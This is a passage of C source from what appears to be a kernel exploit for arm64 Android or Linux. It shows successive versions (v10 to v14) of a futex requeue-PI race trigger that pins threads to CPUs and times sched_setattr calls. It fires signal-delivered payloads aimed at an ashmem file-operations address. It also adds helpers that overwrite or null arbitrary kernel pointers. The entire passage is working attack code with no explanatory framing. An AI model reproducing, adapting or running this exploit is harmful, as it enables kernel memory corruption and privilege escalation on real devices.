  g_post_cb_ctx = NULL;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v10, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v10] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v10] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_sched_setattr_result_ok)) {
    fprintf(stderr, "[futex-v10] sched_setattr route not ok\n");
    return 0;
  }
  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr,
          "[futex-v10] calling post-trigger callback after full trigger "
          "completed (real gate never opens from the waiter thread)\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v10] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v10_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v10] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v10_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *waiter_thread_fn_v11(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v11] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v11] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v11] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {

      atomic_store(&g_sigusr1_done, 1);

      struct timespec spin_deadline;
      clock_gettime(CLOCK_MONOTONIC, &spin_deadline);
      spin_deadline.tv_sec += 1;
      while (!atomic_load(&g_sched_setattr_done)) {
        __asm__ volatile("yield" ::: "memory");
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > spin_deadline.tv_sec ||
            (now.tv_sec == spin_deadline.tv_sec &&
             now.tv_nsec > spin_deadline.tv_nsec)) {
          break;
        }
      }

      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v11] calling post-trigger callback from WAITER "
                "thread after scheduler confirmation\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v11] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v11] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < TARGET_FUTEX_OWNER_SPINS && !atomic_load(&owner_acquired);
       spins++) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v11_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v11] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sched_setattr_result_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v11, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v11] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v11] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v11] verify callback never invoked (real gate "
                     "did not open this run)\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v11_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v11] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v11_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *waiter_thread_fn_v12(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v12] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v12] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v12] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {

      atomic_store(&g_sigusr1_done, 1);

      for (uint64_t spins = 0;
           spins < TARGET_FUTEX_LONG_SPIN_MAX &&
           !atomic_load(&g_sched_setattr_done);
           spins++) {
        __asm__ volatile("yield" ::: "memory");
      }

      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v12] calling post-trigger callback from WAITER "
                "thread after scheduler confirmation\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v12] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v12] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < TARGET_FUTEX_OWNER_SPINS && !atomic_load(&owner_acquired);
       spins++) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v12_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v12] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sched_setattr_result_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v12, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v12] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v12] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v12] verify callback never invoked (real gate "
                     "did not open this run)\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v12_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v12] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v12_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *waiter_thread_fn_v13(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v13] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v13] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v13] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* axis A: kept, identical to v9. */
      int otid = atomic_load(&owner_tid_g);
      if (otid != 0) {
        long kret = syscall(SYS_tgkill, getpid(), otid, SIGUSR2);
        fprintf(stderr,
                "[futex-v13] tgkill(owner tid=%d, SIGUSR2) ret=%ld errno=%d\n",
                otid, kret, errno);
      }
      usleep(TARGET_FUTEX_LONG_PAUSE_USEC);
      atomic_store(&g_sigusr1_done, 1);

      /* axis B: swapped to v12's busy-spin. */
      for (uint64_t spins = 0;
           spins < TARGET_FUTEX_LONG_SPIN_MAX &&
           !atomic_load(&g_sched_setattr_done);
           spins++) {
        __asm__ volatile("yield" ::: "memory");
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v13] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v13] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v13] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < TARGET_FUTEX_OWNER_SPINS && !atomic_load(&owner_acquired);
       spins++) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v13_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v13] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v13, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v13] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v13] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v13] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v13_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v13] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v13_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *consumer_thread_fn_v14(void *arg) {
  (void)arg;
  if (!pin_to_cpu(1)) {
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }
  atomic_store(&g_v14_consumer_cpu, sched_getcpu());

  int previous_state = 0;
  while (!atomic_load(&g_v14_state.stop)) {
    int state = atomic_load(&g_v14_state.state);
    int tid = atomic_load(&g_v14_state.waiter_tid);

    if (state == 0) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    if (state == -1) {
      atomic_store(&g_v14_state.gate, 1);
      while (!atomic_load(&g_v14_state.stop) &&
             atomic_load(&g_v14_state.state) == -1) {
        __asm__ volatile("yield" ::: "memory");
      }
      continue;
    }

    if (state == previous_state) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    previous_state = state;

    if (atomic_load(&g_v14_state.stop) ||
        atomic_load(&g_v14_state.state) != state) {
      continue;
    }

    if (state == 1 && g_sched_mutation_state != NULL) {
      __atomic_store_n(g_sched_mutation_state, g_sched_pending_state,
                       __ATOMIC_RELEASE);
    }

    int delay_us = atomic_load(&g_v14_state.delay_us);
    if (delay_us > 0) {
      usleep((useconds_t)delay_us);
    }
    spin_wait_cycles(g_v14_delay_cycles);

    if (atomic_load(&g_v14_state.stop) ||
        atomic_load(&g_v14_state.state) != state) {
      continue;
    }

    atomic_fetch_add_explicit(&g_v14_state.attempt_count, 1,
                              memory_order_relaxed);
    errno = 0;
    int nice_value = 19 - ((state - 1) % 8);
    long ret = sched_setattr_tid_v4(tid, nice_value);
    int sched_errno = errno;
    atomic_store(&g_v14_sched_ret, (int)ret);
    atomic_store(&g_v14_sched_errno, sched_errno);
    if (state == 1 && g_sched_mutation_state != NULL) {
      __atomic_store_n(g_sched_mutation_state, g_sched_mutated_state,
                       __ATOMIC_RELEASE);
    }
    if (ret == 0) {
      atomic_fetch_add_explicit(&g_v14_state.success_count, 1,
                                memory_order_relaxed);
    }
    atomic_store(&g_v14_state.sched_done, 1);
    atomic_store(&g_v14_state.state, 0);
  }
  return NULL;
}

static int futex_v14_followup_write(uint64_t page_base,
                                    uint64_t target_addr,
                                    uint64_t replacement_addr,
                                    int write_null) {
  int waiter_tid = atomic_load(&g_v14_state.waiter_tid);
  if (!atomic_load(&g_use_sigusr1) || atomic_load(&g_v14_state.stop) ||
      atomic_load(&g_v14_state.state) != 0 || waiter_tid == 0 ||
      waiter_tid != (int)syscall(SYS_gettid)) {
    return 0;
  }

  if (write_null) {
    sigusr1_build_null_write_payload(page_base, target_addr);
  } else {
    sigusr1_build_pointer_write_payload(page_base, target_addr,
                                        replacement_addr);
  }
  if (!sigusr1_fire_and_wait()) {
    return 0;
  }

  atomic_store(&g_v14_state.sched_done, 0);
  atomic_store(&g_v14_state.success_count, 0);
  atomic_store(&g_v14_state.attempt_count, 0);
  int epoch = atomic_fetch_add(&g_v14_followup_epoch, 1);
  atomic_store(&g_v14_state.state, epoch);

  for (uint64_t spins = 0;
       spins <= TARGET_FUTEX_LONG_SPIN_MAX &&
           !atomic_load(&g_v14_state.sched_done) &&
           !atomic_load(&g_v14_state.stop);
       spins++) {
    __asm__ volatile("yield" ::: "memory");
  }

  int ok = atomic_load(&g_v14_state.sched_done) &&
           atomic_load(&g_v14_state.success_count) >= 1;
  atomic_store(&g_v14_state.state, 0);
  return ok;
}

int futex_v14_rewrite_pointer(uint64_t page_base, uint64_t target_addr,
                              uint64_t replacement_addr) {
  return futex_v14_followup_write(page_base, target_addr, replacement_addr,
                                  0);
}

int futex_v14_quarantine_pointer(uint64_t page_base, uint64_t target_addr) {
  return futex_v14_followup_write(page_base, target_addr, 0, 1);
}

static void *waiter_thread_fn_v14(void *arg) {
  (void)arg;
  if (!pin_to_cpu(3)) {
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }
  atomic_store(&g_v14_waiter_cpu, sched_getcpu());
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&g_v14_state.waiter_tid, tid);

  sigset_t unblock_set;
  sigemptyset(&unblock_set);
  sigaddset(&unblock_set, SIGUSR1);
  int unblock_error = pthread_sigmask(SIG_UNBLOCK, &unblock_set, NULL);
  if (unblock_error != 0) {
    fprintf(stderr, "[futex-v14] SIGUSR1 unblock failed error=%d\n",
            unblock_error);
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }

  if (!sigusr1_install_handler()) {
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }

  if (futex_op(&g_v14_state.pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) !=
      0) {
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }

  atomic_store(&g_v14_state.waiter_ready, 1);
  while (!atomic_load(&g_v14_state.owner_started) &&
         !atomic_load(&g_v14_state.stop)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  if (atomic_load(&g_v14_state.stop)) {
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += g_futex_wait_sec;

  atomic_store(&g_v14_state.waiter_waiting, 1);
  (void)futex_op(&g_v14_state.wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                 &g_v14_state.pi_target, 0);
  futex_v14_dbg("wait-requeue-pi-returned");

  atomic_store(&g_v14_state.sched_done, 0);
  atomic_store(&g_v14_state.gate, 0);
  atomic_store(&g_v14_state.success_count, 0);
  atomic_store(&g_v14_state.attempt_count, 0);
  /* The target waiter clears the initial delay before
   * publishing state=-1. The default consumer pass therefore does not
   * sleep between rt_sigreturn and sched_setattr. */
  atomic_store(&g_v14_state.delay_us, 0);
  atomic_store(&g_v14_state.stop, 0);
  atomic_store(&g_v14_state.state, -1);

  int gate_seen = wait_for_atomic_deadline(
      &g_v14_state.gate, 1, TARGET_FUTEX_GATE_TIMEOUT_MS);
  atomic_store(&g_v14_gate_seen, gate_seen);
  int sig_ok = 0;
  if (gate_seen && atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    sig_ok = sigusr1_fire_and_wait();
  }
  atomic_store(&g_v14_sig_ok, sig_ok);

  if (sig_ok) {
    uint64_t spin_epoch;
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(spin_epoch));
    (void)spin_epoch;
    atomic_store(&g_v14_state.state, 1);

    for (uint64_t spins = 0;
         spins <= TARGET_FUTEX_LONG_SPIN_MAX &&
             !atomic_load(&g_v14_state.sched_done);
         spins++) {
      __asm__ volatile("yield" ::: "memory");
    }

    atomic_store(&g_v14_state.state, 0);
    (void)atomic_load(&g_v14_state.attempt_count);
    if (atomic_load(&g_v14_state.success_count) >= 1 && g_post_cb != NULL) {
      int cb_ret = g_post_cb(g_post_cb_ctx);
      atomic_store(&g_cb_result, cb_ret);
      atomic_store(&g_cb_invoked, 1);
    }
  } else {
    atomic_store(&g_v14_state.state, 0);
  }

  atomic_store(&waiter_ok, 1);
  atomic_store(&g_v14_state.state, 0);
  atomic_store(&g_v14_state.stop, 1);
  atomic_store(&g_v14_state.route_done, 1);

  (void)futex_op(&g_v14_state.pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&g_v14_state.owner_acquired)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  return NULL;
}

static void *owner_thread_fn_v14(void *arg) {
  (void)arg;
  if (futex_op(&g_v14_state.pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) !=
      0) {
    return NULL;
  }
  while (!atomic_load(&g_v14_state.waiter_ready)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  atomic_store(&g_v14_state.owner_started, 1);
  (void)futex_op(&g_v14_state.pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&g_v14_state.owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  g_futex_dbg_t0 = futex_now_ms();
  g_futex_dbg_last = g_futex_dbg_t0;
  g_futex_wait_sec = futex_env_int_clamped("FUTEX_WAIT_SEC", WAIT_SEC, 1, WAIT_SEC);
  fprintf(stderr, "[futex-v14] FUTEX_WAIT_SEC=%d (default %d)\n",
          g_futex_wait_sec, WAIT_SEC);
  oss_pipe_rw_reset();
  /* Resolve environment/libc work before either critical thread exists.
   * The consumer path after the waiter's rt_sigreturn must contain no
   * getenv/atoi calls before sched_setattr. */
  g_v14_delay_cycles = supervisor_attempt_delay_cycles();
  g_v14_state.wait = 0;
  g_v14_state.pi_target = 0;
  g_v14_state.pi_chain = 0;
  atomic_store(&g_v14_state.waiter_tid, 0);
  atomic_store(&g_v14_state.route_done, 0);
  atomic_store(&g_v14_state.waiter_ready, 0);
  atomic_store(&g_v14_state.owner_started, 0);
  atomic_store(&g_v14_state.waiter_waiting, 0);
  atomic_store(&g_v14_state.sched_done, 0);
  atomic_store(&g_v14_state.gate, 0);
  atomic_store(&g_v14_state.owner_acquired, 0);
  atomic_store(&g_v14_state.attempt_count, 0);
  atomic_store(&g_v14_state.success_count, 0);
  atomic_store(&g_v14_state.stop, 0);

  atomic_store(&g_v14_state.delay_us, TARGET_FUTEX_INITIAL_DELAY_US);
  atomic_store(&g_v14_state.state, 0);
  atomic_store(&g_v14_state.secondary_0, 0);
  atomic_store(&g_v14_state.secondary_1, 0);
  atomic_store(&g_v14_followup_epoch, 2);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;
  atomic_store(&g_v14_gate_seen, 0);
  atomic_store(&g_v14_sig_ok, 0);
  atomic_store(&g_v14_sched_ret, -2);
  atomic_store(&g_v14_sched_errno, 0);
  atomic_store(&g_v14_waiter_cpu, -1);
  atomic_store(&g_v14_consumer_cpu, -1);

  if (!verify_v14_cpu_contract()) return 0;

  if (!pin_to_cpu(0)) {
    fprintf(stderr, "[futex-v14] CPU-0 affinity failed errno=%d\n", errno);
    return 0;
  }

  pthread_t waiter, owner, consumer;
  int thread_error =
      pthread_create(&waiter, NULL, waiter_thread_fn_v14, NULL);
  if (thread_error != 0) {
